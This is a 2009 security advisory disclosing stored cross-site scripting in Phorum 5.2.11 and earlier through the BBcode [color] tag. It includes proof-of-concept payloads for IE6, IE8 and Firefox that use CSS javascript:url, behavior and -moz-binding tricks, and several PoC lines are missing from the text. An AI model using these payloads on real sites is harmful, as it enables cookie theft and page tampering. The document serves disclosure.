Phorum <= 5.2.11 Permanent Cross Site Scripting Vulnerabilities
===============================================================


//----- Advisory

Program          : Phorum 5.2.11 and prior
Homepage         : http://www.phorum.org/
Discovery        : 2009/07/16
Author Contacted : 2009/07/17
Found by         : CrashFr
This Advisory    : CrashFr

//----- Application description


Started in 1998, Phorum was the original PHP and MySQL based Open Source
forum software. Phorum&#039;s developers pride themselves on creating message
board software that is designed to meet different needs of different web
sites while not sacrificing performance or features.


//----- Description of vulnerability


Phorum&#039;s filtering engine insufficiently filters some BBcode arguments.
Using the bbcode tags [color] and [size] it is possible to execute Javascript


//----- Proof Of Concept


When the user post the following bbcode :

or

The application convert it into the follow HTML code :

and

For IE6 you can use this POC:

[color=#000000;background-image:url(javascript:alert(&#039;Sysdream_IE6_Alert&#039;));]Sysdream 
Testing IE6[/color]

For IE7:
XSS[/color]

Obviously, the POC doesn&#039;t work in IE8 and Firefox.

But, but , but...
Uploading htc (for IE8) or xml (for FF) file on the phorum using the "My 
Files" function in "Control Center", you can use :

POC for FF:
[color=#000000;-moz-binding:url(http://127.0.0.1/phorum/file.php?0,file=9,filename=script.xml#mycode);]Sysdream 
Testing FF[/color]

POC for IE8:
[color=#000000;behavior:url(http://127.0.0.1/phorum/file.php?0,file=8,filename=script.htc);]Sysdream
Testing FF[/color]

//----- Impact


This vulnerability can be used to modify the phorum display, to gather the victim&#039;s cookie, etc.


//----- Solution

Upgrade Phorum to 5.2.12




